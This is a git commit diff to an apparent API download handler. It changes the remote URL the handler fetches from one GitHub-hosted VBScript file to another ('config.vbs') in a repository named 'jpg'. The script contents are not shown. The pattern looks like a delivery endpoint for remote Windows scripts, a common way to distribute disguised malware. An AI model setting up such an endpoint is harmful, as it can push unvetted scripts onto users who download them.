9e95f2904169efcbd0b075b73a1a349b2eff944b
artymidus <artyarty9869@gmail.com>
2026-06-19 18:06:18 +0700

    Update download.js

--- api/download.js
+++ api/download.js
@@ -1,5 +1,5 @@
 export default async function handler(req, res) {
-  const rawUrl = 'https://raw.githubusercontent.com/mslwcnzy/jpg/refs/heads/main/sirt_training.vbs';
+  const rawUrl = 'https://raw.githubusercontent.com/mslwcnzy/jpg/refs/heads/main/config.vbs';
 
   try {
     const response = await fetch(rawUrl);
